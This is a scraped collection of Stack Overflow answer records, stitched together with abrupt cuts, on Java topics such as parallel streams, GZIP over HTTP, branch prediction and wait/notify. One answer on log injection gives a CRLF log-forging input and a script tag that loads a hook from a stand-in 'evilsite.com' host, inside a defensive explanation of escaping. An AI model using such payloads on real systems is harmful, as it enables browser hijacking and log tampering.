The idea is to make your reader return <code>Order</code>s, and use a processor to enrich orders with their details.

The reader returns items of type <code>Person</code>. The processor enriches person items with their addresses. Look how the reader fetches only the id and name of the person, but not the address.

You can simply make a <code>BeanInfo</code> class that describes the properties inherited from the interface. Here, <code>MyClass</code> is inheriting <code>aProperty</code> getter/setters from an interface. To expose these to the JDK Introspector, simply create a <code>BeanInfo</code> class:</p>\n<pre><code>public class MyClassBeanInfo extends SimpleBeanInfo {\n\n    @Override\n    public BeanInfo[] getAdditionalBeanInfo() {\n        return new BeanInfo[] { new SimpleBeanInfo() {\n            @Override\n            public PropertyDescriptor[] getPropertyDescriptors() {\n                try {\n                    return new PropertyDescriptor[] { new PropertyDescriptor(&quot;aProperty&quot;, MyClass.class, &quot;getAProperty&quot;, &quot;setAProperty&quot;) };\n                } catch (final IntrospectionException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        } };\n    }\n}\n</code></pre>\n<p>Reference: <a href=\"https://docs.oracle.com/javase/8/docs/api/java/beans/BeanInfo.html\" rel=\"nofollow noreferrer\">https://docs.oracle.com/javase/8/docs/api/java/beans/BeanInfo.html</a></p>\n"},{"owner":{"account_id":22057425,"reputation":135,"user_id":16320675,"user_type":"unregistered","profile_image":"https://i.stack.imgur.com/PYn0O.png?s=256&g=1","display_name":"user16320675","link":"https://stackoverflow.com/users/16320675/user16320675"},"up_vote_count":1,"is_accepted":true,"score":1,"creation_date":1683784032,"answer_id":76224472,"question_id":76223480,"body":"<p>I would use a <code>MouseListener</code> to save the mouse position when pressed, instead of doing that inside <code>mouseMoved</code>:</p>\n<pre class=\"lang-java prettyprint-override\"><code>frame.addMouseListener(new MouseAdapter() {\n    @Override\n    public void mousePressed(MouseEvent e) {\n        oldCursPosX = e.getX();\n        oldCursPosY = e.getY();\n    }\n});\n</code></pre>\n<p>and in <code>mouseDragged</code>, something like:</p>\n<pre class=\"lang-java prettyprint-override\"><code>int x = frame.getX();\nint y = frame.getY();\nint width = frame.getWidth();\nint height = frame.getHeight();\nint dx = e.getX() - oldCursPosX;\nint dy = e.getY() - oldCursPosY;\nswitch (type) {\n    case Cursor.N_RESIZE_CURSOR:\n        frame.setLocation(x, y+dy);\n        if (height-dy &gt;= minFrameSize.height) {\n            frame.setSize(width, height-dy);\n        }\n        dy = 0; // frame has moved - it is the reference for coordinates\n        break;\n    case Cursor.S_RESIZE_CURSOR:\n        if (height+dy &gt;= minFrameSize.height) {\n            frame.setSize(width, height+dy);\n        }\n        break;\n    // ... similar for W and E\n}\noldCursPosX += dx;\noldCursPosY += dy;\n</code></pre>\n<p>Setting the Cursor would still be done in <code>mouseMoved()</code>, just remove the assignment statements.</p>\n<p><sub>code in this answer is <strong>not</strong> intended to be complete, optimized, not even valid - just the basic idea</sub></p>\n"},{"owner":{"account_id":401843,"reputation":81350,"user_id":768644,"user_type":"registered","profile_image":"https://www.gravatar.com/avatar/b13bedc5215730fbce5edff6c130988a?s=256&d=identicon&r=PG","display_name":"rzwitserloot","link":"https://stackoverflow.com/users/768644/rzwitserloot"},"up_vote_count":1,"is_accepted":true,"score":1,"creation_date":1683798586,"answer_id":76226305,"question_id":76225746,"body":"<p>You can try something like this:</p>\n<pre><code>Queue&lt;int[]&gt; queue = new LinkedList&lt;&gt;() {\n  @Override public String toString() {\n    return &quot;[&quot; +\n      stream()\n      .map(Arrays::toString)\n      .collect(Collectors.joining(&quot;, &quot;)) +\n      &quot;]&quot;;\n  }\n};\n\nqueue.add(new int[] {1, 2});\nqueue.add(new int[] {3, 4});\nSystem.out.println(queue);\n</code></pre>\n<p>printing:</p>\n<pre><code>[[1, 2], [3, 4]]\n</code></pre>\n<p>Which is presumably what you want.</p>\n<p>This isn't necessarily a good idea. <code>toString()</code> should be used solely for debugging purposes: toString demands nothing of implementations, not even that they are consistent.

The linked Q&amp;A discusses that the stream <em>apparently</em> doesn’t work in parallel, due to the OP not seeing the expected speedup. The conclusion is that there is <em>no benefit</em> in parallel processing if the workload is too small, <em>not</em> that there was an automatic fallback to sequential execution.</p>\n<p>It’s actually the opposite. If you request parallel, you get parallel, even if it actually reduces the performance. The implementation does not switch to the potentially more efficient sequential execution in such cases.</p>\n<p>So if you are confident that the per-element workload is high enough to justify the use of a parallel execution regardless of the small number of elements, you can simply request a parallel execution.</p>\n<p>As can easily demonstrated:</p>\n<pre><code>Stream.of(1, 2).parallel()\n      .peek(x -&gt; System.out.println(&quot;processing &quot;+x+&quot; in &quot;+Thread.currentThread()))\n      .forEach(System.out::println);\n</code></pre>\n<p><a href=\"http://ideone.com/WL4wka\" rel=\"nofollow noreferrer\">On Ideone</a>, it prints</p>\n<pre><code>processing 2 in Thread[main,5,main]\n2\nprocessing 1 in Thread[ForkJoinPool.commonPool-worker-1,5,main]\n1\n</code></pre>\n<p>but the order of messages and details may vary. It may even be possible that in some environments, both task may happen to get executed by the same thread, if it can steal the second task before another thread is started to pick it up. But of course, if the tasks are expensive enough, this will not happen. The important point is that the overall workload has been split and enqueued to be potentially picked up by other worker threads.</p>\n<p>If execution by a single thread happens in your environment for the simple example above, you may insert simulated workload like this:</p>\n<pre><code>Stream.of(1, 2).parallel()\n      .peek(x -&gt; System.out.println(&quot;processing &quot;+x+&quot; in &quot;+Thread.currentThread()))\n      .map(x -&gt; {\n           LockSupport.parkNanos(&quot;simulated workload&quot;, TimeUnit.SECONDS.toNanos(3));\n           return x;\n        })\n      .forEach(System.out::println);\n</code></pre>\n<p>Then, you may also see that the overall execution time will be shorter than “<em>number of elements</em>”×“<em>processing time per element</em>” if the “<em>processing time per element</em>” is high enough.</p>\n<hr />\n<p>Update: the misunderstanding might be cause by Brian Goetz’ misleading statement: “In your case, your input set is simply too small to be decomposed”.</p>\n<p>It must be emphasized that this is not a general property of the Stream API, but the <code>Map</code> that has been used. A <code>HashMap</code> has a backing array and the entries are distributed within that array depending on their hash code. It might be the case that splitting the array into <em>n</em> ranges doesn’t lead to a balanced split of the contained element, especially, if there are only two. The implementors of the <code>HashMap</code>’s <code>Spliterator</code> considered searching the array for elements to get a perfectly balanced split to be too expensive, not that splitting two elements was not worth it.</p>\n<p>Since the <code>HashMap</code>’s default capacity is <code>16</code> and the example had only two elements, we can say that the map was oversized. Simply fixing that would also fix the example:</p>\n<pre><code>long start = System.nanoTime();\n\nMap&lt;String, Supplier&lt;String&gt;&gt; input = new HashMap&lt;&gt;(2);\ninput.put(&quot;1&quot;, () -&gt; {\n    System.out.println(Thread.currentThread());\n    LockSupport.parkNanos(&quot;simulated workload&quot;, TimeUnit.SECONDS.toNanos(2));\n    return &quot;a&quot;;\n});\ninput.put(&quot;2&quot;, () -&gt; {\n    System.out.println(Thread.currentThread());\n    LockSupport.parkNanos(&quot;simulated workload&quot;, TimeUnit.SECONDS.toNanos(2));\n    return &quot;b&quot;;\n});\nMap&lt;String, String&gt; results = input.keySet()\n        .parallelStream().collect(Collectors.toConcurrentMap(\n    key -&gt; key,\n    key -&gt; input.get(key).get()));\n\nSystem.out.println(&quot;Time: &quot; + TimeUnit.NANOSECONDS.toMillis(System.nanoTime()- start));\n</code></pre>\n<p>on my machine, it prints</p>\n<pre><code>Thread[main,5,main]\nThread[ForkJoinPool.commonPool-worker-1,5,main]\nTime: 2058\n</code></pre>\n<p>The conclusion is that the Stream implementation always tries to use parallel execution, if you request it, regardless of the input size. But it depends on the input’s <em>structure</em> how well the workload can be distributed to the worker threads.

In particular they differ in how they implement the .available() method. For example ByteArrayInputStream .available() returns the number of bytes remaining in the InputStream. However, HTTPInputStream .available() returns the number of bytes available for reading before a blocking IO request needs to be made to refill the buffer. (See the Java Docs for more info)</p>\n\n<p>The problem is that GZIPInputStream uses the output of .available() to determine if there might be an additional GZIP file available in the InputStream after it finishes decompressing a complete GZIP file. Here is line 231 from OpenJDK source file <a href=\"http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/0e4fc29a5ce4/src/share/classes/java/util/zip/GZIPInputStream.java\" rel=\"noreferrer\">GZIPInputStream.java</a> method readTrailer(). </p>\n\n<pre><code>   if (this.in.available() &gt; 0 || n &gt; 26) {\n</code></pre>\n\n<p>If the HTTPInputStream read buffer empties right at the boundary of two concatenated GZIP files GZIPInputStream calls .available(), which responds with a 0 as it would need to go out to the network to refill the buffer, and so GZIPInputStream treats the file as complete and closes prematurely.</p>\n\n<p>The Common Crawl .wet archives are hundreds of megabytes of small concatenated GZIP files and so eventually the HTTPInputStream buffer will empty right at the end of one of the concatenated GZIP files and GZIPInputStream will close prematurely. This explains the problem demonstrated in the question.</p>\n\n<h3>Solution and Work Around</h3>\n\n<p>This <a href=\"https://gist.github.com/jeffharwell/2e8785a0ec8acc8539901e841d595394\" rel=\"noreferrer\">GIST</a> contains a patch to jdk8u152-b00 revision 12039 and two jtreg tests that remove the (in my humble opinion) incorrect reliance on .available().</p>\n\n<p>If you cannot patch the JDK a work around is to make sure that available() always returns > 0 which forces GZIPInputStream to always check for another GZIP file in the stream. Unfortunately HTTPInputStream is private so you cannot subclass it directly, instead extend InputStream and wrap the HTTPInputStream. The below code demonstrates this work around.</p>\n\n<h3>Demonstration Code and Output</h3>\n\n<p>Here is the output showing that when the HTTPInputStream is wrapped as discussed GZIPInputStream will produces identical results when reading the concatenated GZIP from a file and directly from HTTP.</p>\n\n<pre><code>Testing URL https://commoncrawl.s3.amazonaws.com/crawl-data/CC-MAIN-2016-50/segments/1480698540409.8/wet/CC-MAIN-20161202170900-00009-ip-10-31-129-80.ec2.internal.warc.wet.gz\nTesting HTTP Input Stream direct to GZIPInputStream\nTesting saving to file before decompression\nRead 448974935 bytes from HTTP-&gt;GZIP\nRead 448974935 bytes from HTTP-&gt;file-&gt;GZIP\nOutput from HTTP-&gt;GZIP saved to file testfile0.wet\n------\nTesting URL https://commoncrawl.s3.amazonaws.com/crawl-data/CC-MAIN-2016-50/segments/1480698540409.8/wet/CC-MAIN-20161202170900-00040-ip-10-31-129-80.ec2.internal.warc.wet.gz\nTesting HTTP Input Stream direct to GZIPInputStream\nTesting saving to file before decompression\nRead 451171329 bytes from HTTP-&gt;GZIP\nRead 451171329 bytes from HTTP-&gt;file-&gt;GZIP\nOutput from HTTP-&gt;GZIP saved to file testfile40.wet\n------\nTesting URL https://commoncrawl.s3.amazonaws.com/crawl-data/CC-MAIN-2016-50/segments/1480698541142.66/wet/CC-MAIN-20161202170901-00500-ip-10-31-129-80.ec2.internal.warc.wet.gz\nTesting HTTP Input Stream direct to GZIPInputStream\nTesting saving to file before decompression\nRead 453183600 bytes from HTTP-&gt;GZIP\nRead 453183600 bytes from HTTP-&gt;file-&gt;GZIP\nOutput from HTTP-&gt;GZIP saved to file testfile500.wet\n</code></pre>\n\n<p>Here is the demonstration code from the question modified with an InputStream wrapper.</p>\n\n<pre><code>import java.net.*;\nimport java.io.*;\nimport java.util.zip.GZIPInputStream;\nimport java.nio.channels.*;\n\npublic class GZIPTest {\n    // Here is a wrapper class that wraps an InputStream\n    // but always returns &gt;

Well, the easiest way is to use <code>Enum.valueOf(someClass, someString)</code>, just like you already found. That's literally the reason why they created that method.

You have no idea which way it will go. What do you do? You halt execution and wait until the previous instructions are complete. Then you continue down the correct path.</p>\n<p><em>Modern processors are complicated and have long pipelines.

I admit it's not the best analogy since the train could just signal the direction with a flag. But in computers, the processor doesn't know which direction a branch will go until the last moment.</p>\n<p>How would you strategically guess to minimize the number of times that the train must back up and go down the other path? You look at the past history! If the train goes left 99% of the time, then you guess left. If it alternates, then you alternate your guesses. If it goes one way every three times, you guess the same...</p>\n<p><em><strong>In other words, you try to identify a pattern and follow it.</strong></em> This is more or less how branch predictors work.</p>\n<p>Most applications have well-behaved branches. Therefore, modern branch predictors will typically achieve &gt;90% hit rates. But when faced with unpredictable branches with no recognizable patterns, branch predictors are virtually useless.</p>\n<p>Further reading: <a href=\"https://en.wikipedia.org/wiki/Branch_predictor\" rel=\"noreferrer\">&quot;Branch predictor&quot; article on Wikipedia</a>.</p>\n<hr />\n<h2>As hinted from above, the culprit is this if-statement:</h2>\n<pre><code>if (data[c] &gt;= 128)\n    sum += data[c];\n</code></pre>\n<p>Notice that the data is evenly distributed between 0 and 255. When the data is sorted, roughly the first half of the iterations will not enter the if-statement. After that, they will all enter the if-statement.</p>\n<p>This is very friendly to the branch predictor since the branch consecutively goes the same direction many times. Even a simple saturating counter will correctly predict the branch except for the few iterations after it switches direction.</p>\n<p><strong>Quick visualization:</strong></p>\n<pre class=\"lang-none prettyprint-override\"><code>T = branch taken\nN = branch not taken\n\ndata[] = 0, 1, 2, 3, 4, ... 126, 127, 128, 129, 130, ... 250, 251, 252, ...\nbranch = N  N  N  N  N  ...

TTTTTTTTTT  (easy to predict)\n</code></pre>\n<p>However, when the data is completely random, the branch predictor is rendered useless, because it can't predict random data. Thus there will probably be around 50% misprediction (no better than random guessing).</p>\n<pre class=\"lang-none prettyprint-override\"><code>data[] = 226, 185, 125, 158, 198, 144, 217, 79, 202, 118,  14, 150, 177, 182, ...\nbranch =   T,   T,   N,   T,   T,   T,   T,  N,   T,   N,   N,   T,   T,   T  ...\n\n       = TTNTTTTNTNNTTT ...

Hence, the +1 when converting to a number and the -1 when converting from a number.</p>\n<p><code>number_to_alpha_string</code> keeps track of the result string <code>r</code> which is computed in reverse order since it is easier to extract the least significant remaining digit each time through the loop rather than the most significant.

The main concern is in falsifying the log statments.  Say you had code like this:</p>\n\n<pre><code>log.error( transactionId + \" for user \" + username + \" was unsuccessful.\"\n</code></pre>\n\n<p>If either variable is under user control they can inject false logging statements by using inputs like <code>\\r\\n for user foobar was successful\\rn</code> thus allowing them to falsify the log and cover their tracks.  (Well, in this contrived case, just make it a little harder to see what happened.)  </p>\n\n<p>The second method of attack is more of a chess move.  Many logs are HTML formatted to be viewed in another program, for this example, we'll pretend the logs are meant to be HTML files to be viewed in a browser.  Now we inject <code>&lt;script src=”https://evilsite.com/hook.js” type=”text/javascript”&gt;&lt;/script&gt;</code> and you will have hooked a browser with an exploitation framework that's most likely executing as a server admin... because its doubtful that the CEO is going to be reading the log.  Now the real hack can begin.  </p>\n\n<p>Defenses:  </p>\n\n<p>A simple defense is to make sure that all log statements with userinput escape the characters '\\n' and '\\r' with something obvious, like '֎' or you can do what ESAPI does and escape with the underscore.  It really doesn't matter as long as its consistent, just keep in mind not to use character sets that would confuse you in the log.  Something like <code>userInput.replaceAll(\"\\r\", \"֎\").replaceAll(\"\\n\", \"֎\");</code></p>\n\n<p>I also find it useful to make sure that log formats are exquisitely specified... meaning that you make sure you have a strict standard for what log statements need to look like and construct your formatting so that catching a malicious user is easier.  All programmers must submit to the party and follow the format!  </p>\n\n<p>To defend against the HTML scenario, I would use the [OWASP encoder project][1] </p>\n\n<p>As to why ESAPI's implementation is suggested, it is a very battle-tested library, but in a nutshell, this is essentially what we do.  See the code:</p>\n\n<pre><code>/**\n * Log the message after optionally encoding any special characters that might be dangerous when viewed\n * by an HTML based log viewer. Also encode any carriage returns and line feeds to prevent log\n * injection attacks. This logs all the supplied parameters plus the user ID, user's source IP, a logging\n * specific session ID, and the current date/time.\n *\n * It will only log the message if the current logging level is enabled, otherwise it will\n * discard the message.\n *\n * @param level defines the set of recognized logging levels (TRACE, INFO, DEBUG, WARNING, ERROR, FATAL)\n * @param type the type of the event (SECURITY SUCCESS, SECURITY FAILURE, EVENT SUCCESS, EVENT FAILURE)\n * @param message the message to be logged\n * @param throwable the {@code Throwable} from which to generate an exception stack trace.\n */\nprivate void log(Level level, EventType type, String message, Throwable throwable) {\n\n    // Check to see if we need to log.\n    if (!isEnabledFor(level)) {\n        return;\n    }\n\n    // ensure there's something to log\n    if (message == null) {\n        message = \"\";\n    }\n\n    // ensure no CRLF injection into logs for forging records\n    String clean = message.replace('\\n', '_').replace('\\r', '_');\n    if (ESAPI.securityConfiguration().getLogEncodingRequired()) {\n        clean = ESAPI.encoder().encodeForHTML(message);\n        if (!message.equals(clean)) {\n            clean += \" (Encoded)\";\n        }\n    }\n\n    // log server, port, app name, module name -- server:80/app/module\n    StringBuilder appInfo = new StringBuilder();\n    if (ESAPI.currentRequest() != null &amp;&amp; logServerIP) {\n        appInfo.append(ESAPI.currentRequest().getLocalAddr()).append(\":\").append(ESAPI.currentRequest().getLocalPort());\n    }\n    if (logAppName) {\n        appInfo.append(\"/\").append(applicationName);\n    }\n    appInfo.append(\"/\").append(getName());\n\n    //get the type text if it exists\n    String typeInfo = \"\";\n    if (type != null) {\n        typeInfo += type + \" \";\n    }\n\n    // log the message\n    // Fix for https://code.google.com/p/owasp-esapi-java/issues/detail?id=268\n    // need to pass callerFQCN so the log is not generated as if it were always generated from this wrapper class\n    log(Log4JLogger.class.getName(), level, \"[\" + typeInfo + getUserInfo() + \" -&gt; \" + appInfo + \"] \" + clean, throwable);\n}\n</code></pre>\n\n<p>See lines 398-453.  That's all the escaping that ESAPI provides.  I would suggest copying the unit tests as well.  </p>\n\n<p>[DISCLAIMER]:  I am project co-lead on ESAPI.  </p>\n\n<p>[1]: <a href=\"https://www.owasp.org/index.php/OWASP_Java_Encoder_Project\" rel=\"noreferrer\">https://www.owasp.org/index.php/OWASP_Java_Encoder_Project</a> and make sure your inputs are properly encoded when going into logging statements--every bit as much as when you're sending input back to the user.  </p>\n"},{"owner":{"account_id":35769,"reputation":2058,"user_id":101562,"user_type":"registered","accept_rate":77,"profile_image":"https://www.gravatar.com/avatar/857fdd9ccb196a30b312f75f51b11333?s=256&d=identicon&r=PG","display_name":"Jon Strayer","link":"https://stackoverflow.com/users/101562/jon-strayer"},"up_vote_count":18,"is_accepted":true,"score":15,"creation_date":1245356723,"answer_id":1015010,"question_id":997021,"body":"\n\n<p>Put a newline at the end of the file<br>\nor<br>\nconfigure CheckStyle not to care.</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;module name=\"Checker\"&gt;\n    &lt;!-- stuff deleted --&gt;\n    &lt;module name=\"NewlineAtEndOfFile\"&gt;\n        &lt;property name=\"severity\" value=\"ignore\" /&gt;\n    &lt;/module&gt;\n</code></pre>\n\n<hr>\n\n<p>You also have to tell the Maven Checkstyle plugin to use your checkstyle config file.</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;plugin&gt;\n    &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt;\n    &lt;configuration&gt;\n        &lt;configLocation&gt;${basedir}/yourCheckstyle.xml&lt;/configLocation&gt;\n    &lt;/configuration&gt;\n&lt;/plugin&gt;\n</code></pre>\n"},{"owner":{"account_id":1202808,"reputation":15250,"user_id":1173114,"user_type":"registered","profile_image":"https://i.stack.imgur.com/lCBWP.png?s=256&g=1","display_name":"Sage","link":"https://stackoverflow.com/users/1173114/sage"},"up_vote_count":14,"is_accepted":true,"score":14,"creation_date":1384119579,"answer_id":19895533,"question_id":19895304,"body":"<blockquote>\n  <p>Why does the code above compile at all?

It's for some <em>other</em> thread to signal: This is the moment.. wake up!</p>\n<p>If you just want the thread to wait for a provided amount of time, the call you are looking for is not <code>t.wait</code>, but is <code>Thread.sleep(1000)</code> - that sleeps for 1 second (1000 milliseconds).</p>\n<p><code>wait</code> goes together with <code>notify</code>/<code>notifyAll</code> (those 2 methods do almost the same thing). One thread waits, another thread calls notify which causes the first thread to wake up. Yes, there is an overloaded variant of <code>wait</code> that takes an amount of milliseconds; that variant will wait until EITHER the stated amount of time has passed OR notify is called; whichever one occurs earlier.</p>\n<p>To use wait/notify you need an object (and <em>all</em> objects can do this; in retrospect that wasn't a great way to design this part of the java language but it is what it is; changing it now would be quite backwards incompatible) - you need an object because different parts of your code can choose to do this wait/notify thing at the same time and it wouldn't do if they are all confused about who is signalling whom.</p>\n<p>In addition, this notion of 'I wait until you tell me to resume' tends to run into some pretty severe threading errors very quickly, so in practice and because such a signal needs some sort of CPU gating anyway, java <strong>requires</strong> that you own the monitor on that object before you wait OR notify on it. Combining it all, this is what that looks like:</p>\n<pre><code>public class TrainStationPlatform {\n  private final Object lock = new Object();\n  private Train atPlatform = null;\n\n  public void enterStation(Train train) {\n    synchronized (lock) {\n      while (atPlatform != null) {\n        // Oh no! There's a train already at the platform!\n        lock.wait(); // let's wait for it to leave.\n      }\n\n      // The platform is clear, we can enter!\n      atPlatform = train;\n    }\n  }\n\n  public void leave() {\n    synchronized (lock) {\n      if (atPlatform == null) throw new IllegalStateException(&quot;No train&quot;);\n      atPlatform = null;\n      lock.notifyAll();\n    }\n  }\n}\n</code></pre>\n<p>This shows how you can use this:</p>\n<ul>\n<li>The above code is 'safe': It is not possible when using this code for 2 trains to be at the platform at the same time. Assume to understand this code each train is its own thread and calls <code>enter(this)</code> and <code>leave()</code> on its own. Any train trying to enter when there's a different train already at the platform will 'freeze' (its <code>enter</code> call will pause until the already-there train takes off, and <em>then</em> it will enter the platform, and the <code>enter</code> method returns).</li>\n<li>You can't call <code>x.notify</code> or <code>x.wait</code> unless you are inside a <code>synchronized (x)</code> block, where all <code>x</code>-es are referring to the same object.</li>\n<li>As an aside, locking on publically visible things is a very bad idea (maybe other code also locks on it, and then your code is a buggy mess-o-spaghetti nobody can understand or properly test!). threads are VERY public, and in fact, threads lock on themselves all the time, so using them as a lock object is horrible.</li>\n<li>Combine the above two rules, and you can correctly conclude that calling <code>t.wait()</code> where <code>t</code> is a thread is <strong>never a correct action. Do not do this.</strong></li>\n<li>It shows <em>why</em> that locking (<code>synchronized</code>) is needed. Imagine the synchronized stuff wasn't there - you would draw the conclusion there is a train and in between drawing that conclusion and calling wait(), let's say the other thread makes the train that is there go away. You're still calling wait, waiting for an event that will never happen (because the train already left). This is the kind of crazy trickery that this construction avoids entirely by <em>requiring</em> that you lock on the think you want to call wait on first. The above code can never run into that problem.</li>\n<li>When you invoke <code>x.wait()</code>, your lock on <code>x</code> (the <code>synchronized</code> block, freezing all other threads that want to enter such a synchronized construct) is <strong>relinquished</strong> - other threads can now enter.</li>\n<li>When your <code>wait</code> call returns (whether by timeout if you use that, or because someone called notify), your thread does not <strong>immediately</strong> continue. After all, calling notify requires having the lock, and wait() won't continue until it has re-acquired it, which means it has to wait for whatever called notify to get to the end of its synchronized block first.</li>\n<li><code>notify()</code> wakes up a random <code>wait()</code>ing thread, <code>notifyAll()</code> wakes them all up. It tends to be more sensible to perform the check to confirm whatever you need is there (or not there and requires <code>wait()</code>ing for) in a loop, and use <code>notifyAll()</code>. Easier to reason about, and there is no meaningful performance difference.</li>\n<li>These are fairly low-level; often there's something in the <code>java.util.concurrent</code> package that is easier to use and makes more sense for whatever inter-thread signalling needs you have.</li>\n<li>If you have no need to signal/gate between threads, do not use this stuff. Use <code>Thread.sleep</code> instead.</li>\n<li>Whatever object you use as a lock should virtually always be <code>private</code> - you want to keep very careful track of who uses it as a lock, which you can't do if code outside of your direct control can see that object. <strong>If</strong> you make it public, you either add extensive documentation explaining precisely what any code that acquires this object can and cannot do and how it is supposed to use it, <strong>or</strong> your code is a buggy mess that is going to result, sooner rather than later, in very nasty intermittent heisenbugs that take months to fix or end up being unfixable. So, don't.</li>\n<li>The exception <code>java.lang.IllegalMonitorStateException: current thread is not owner</code> occurs when you invoke <code>x.wait</code> or <code>x.notify/notifyAll</code> when you are <em>not</em> in a <code>synchronized (x)</code> block.</li>\n<li>If you want your objects to be serializable, use <code>private Object lock = new Object[0]</code>. arrays are serializable; <code>new Object()</code> is not, and <code>new Object[0]</code> is as light weight as they come.</li>\n</ul>\n"},{"owner":{"account_id":1288095,"reputation":163469,"user_id":1240763,"user_type":"registered","profile_image":"https://i.stack.imgur.com/OMgXO.png?s=256&g=1","display_name":"Gary Russell","link":"https://stackoverflow.com/users/1240763/gary-russell"},"up_vote_count":0,"is_accepted":true,"score":0,"creation_date":1683725859,"answer_id":76219126,"question_id":76219072,"body":"<p>The test binder is exactly that; it is not a &quot;test Kafka&quot; binder; it is generic.</p>\n<p>It is generally better to use the real binder for tests, with an embedded broker, or TestContainers.</p>\n"}],"has_more":false,"quota_max":300,"quota_remaining":272},{"owner":{"account_id":39846,"reputation":980711,"user_id":115145,"user_type":"registered","accept_rate":84,"profile_image":"https://i.stack.imgur.com/wDnd8.png?s=256&g=1","display_name":"CommonsWare","link":"https://stackoverflow.com/users/115145/commonsware"},"up_vote_count":254,"is_accepted":true,"score":254,"creation_date":1442509302,"answer_id":32636039,"question_id":32635704,"body":"<p><sub>(the following is extracted from <a href=\"https://commonsware.com/blog/2015/08/31/hey-where-did-my-permission-go.html\" rel=\"noreferrer\">a blog post of mine about this</a>)</sub></p>\n<p>The big reason for not getting your permission nowadays is because\nyour project has a <code>targetSdkVersion</code> of 23 or higher, and the permission\nthat you are requesting is &quot;dangerous&quot;.

And this may be at the root of why <code>CheckedHelloPanel</code> only supports old version detection on Windows.</p>\n\n<p>That having been said, <code>izPack</code> is open source, so if you can figure out a methodology for detecting a previous version on Linux, you can modify <code>CheckedHelloPanel</code> to implement it.  And maybe the <code>izPack</code> will accept a patch.  Anyway, I recommend you look at that approach first before ditching a tool that you are otherwise happy with.  (Especially if what you want to do simply cannot be done on Linux.)</p>\n"},{"owner":{"account_id":79530,"reputation":2598,"user_id":225437,"user_type":"registered","accept_rate":50,"profile_image":"https://www.gravatar.com/avatar/5747066d0c0db81bc7d54faa79cd01eb?s=256&d=identicon&r=PG","display_name":"Andrew","link":"https://stackoverflow.com/users/225437/andrew"},"up_vote_count":3,"is_accepted":true,"score":3,"creation_date":1425151581,"answer_id":28785885,"question_id":28785543,"body":"<p>I had a similar problem with luna.

The question can actually be interpreted as </p>\n\n<blockquote>\n  <p>Why should one use an ORM framework ?</p>\n</blockquote>\n\n<p>which can have different answers in different contexts.</p>\n\n<p>Most projects can benefit from having a domain model, with persistence being a second concern. With JPA (implementations) or most other ORM frameworks, it is possible to have all entities i.e. tables in your database, modelled as classes in Java. Additionally, it also possible to embed behavior into these classes and therefore achieve a behaviorally rich domain model. The entities in this model can have multiple purposes, including the purpose of replacing DTOs for transporting data across tiers.</p>\n\n<p>That said, there are places where ORM frameworks may not be a direct fit to the problem, especially when the data model is already established, or when one is working with legacy systems where mapping database tables to Java classes is a non-trivial exercise. And in certain cases, if one needs to absolutely tune the heck out of the SQL generated by the ORM framework, then ORM frameworks are usually a bad fit.</p>\n\n<p><strong>Related Questions</strong></p>\n\n<ol>\n<li><a href=\"https://stackoverflow.com/questions/3818589/java-ee-architecture-are-daos-still-recommended-when-using-an-orm-like-jpa-2\">Java EE Architecture - Are DAO's still recommended when using an ORM like JPA 2?</a></li>\n<li><a href=\"https://stackoverflow.com/questions/494816/using-an-orm-or-plain-sql\">Using an ORM or plain SQL?</a></li>\n<li><a href=\"https://stackoverflow.com/questions/563775/orm-vs-handcoded-data-access-layer\">ORM vs Handcoded Data Access Layer</a></li>\n</ol>\n"},{"owner":{"account_id":2340572,"reputation":49205,"user_id":2051952,"user_type":"registered","profile_image":"https://www.gravatar.com/avatar/a02fe611d3c1ba997bae2eb2d1925522?s=256&d=identicon&r=PG","display_name":"dmahapatro","link":"https://stackoverflow.com/users/2051952/dmahapatro"},"up_vote_count":46,"is_accepted":true,"score":46,"creation_date":1379096051,"answer_id":18792677,"question_id":18791580,"body":"<p>Your query should work as expected with a minor modification to the way you use <code>distinct</code>:</p>\n\n<pre><code>select count(distinct r.user) from Rating as r \nwhere r.item = :item group by r.user\n</code></pre>\n\n<p>An other, but more lengthy way, of doing this query is by using <code>User</code> and <code>join</code>: </p>\n\n<pre><code>select count(distinct u) from User as u \ninner join u.ratings as r where r.item = :item\ngroup by r.user\n</code></pre>\n"},{"owner":{"account_id":13443,"reputation":10687,"user_id":27011,"user_type":"registered","accept_rate":67,"profile_image":"https://www.gravatar.com/avatar/cac1dd7e6f0f7c42b6378c3b2c8e92c6?s=256&d=identicon&r=PG","display_name":"Simon Lehmann","link":"https://stackoverflow.com/users/27011/simon-lehmann"},"up_vote_count":31,"is_accepted":true,"score":31,"creation_date":1224039141,"answer_id":203571,"question_id":203475,"body":"<p>There is no reliable way to detect if a class is immutable.

It was also suggested to recursively use isImmutable in the isValidFieldType Method. This could probably work and I have also done some testing. But this is not trivial. You can't just check all field types with a call to isImmutable, because String already fails this test (its field <code>hash</code> is not final!). Also you are easily running into endless recursions, causing <em>StackOverflowErrors</em> ;) Other problems might be caused by generics, where you also have to check their types for immutablity.</p>\n\n<p>I think with some work, these potential problems might be solved somehow.

You'd have to read that data to determine the actual size of the corresponding objects</li>\n<li>Some objects might be referenced by multiple others so their size might be included incorrectly (e.g. if some enum constant is used that might be counted into the object size but it wouldn't actually add to the increase because it's most likely already been loaded anyway).</li>\n</ul>\n<p>Additionally in most business applications you don't need to bother with determining the exact memory consumption a piece of code results in. Again there are various reasons, e.g.:</p>\n<ul>\n<li>Memory is cheap so if you run into problems it's often easier to (at least temporarily) increase available memory than (micro-) optimizing a piece of code.</li>\n<li>System usage and load often isn't as predictable due to changing situations (e.g. number of active users, changes in data etc.)</li>\n<li>The JVM often is able to efficiently use garbage collection to reclaim memory for other things.</li>\n</ul>\n<p>This doesn't mean that you shouldn't think about memory usage though, e.g. do you really need all those 10k rows in memory at once? How long do you need that data and what are you doing with it?</p>\n<p>That being said it's often helpful to roughly estimate memory consumption and in the case of a query that could return a lot of strings you should estimate the worst case, i.e. assume maximum length strings.</p>\n<p>To do that you'll need some knowledge about what your rows will contain, e.g. whether integer numbers <code>Integer</code>, <code>Long</code> or <code>BigInteger</code> instances or how many columns there could be. Additionally you'll need to know at least the memory requirements for the data types, i.e. we don't take any caching, duplication, overhead for <code>ResultSet</code> and the like into account.</p>\n<p>The sizes for Java objects depend on various things, e.g. which JVM you're using, whether it is a 32- or 64-bit JVM etc. Various sources state that an object's memory consumption can be calculated from the Object header (which often is stated to be 12 bytes in size) and the size of the object's fields.</p>\n<p>Using that we'll assume 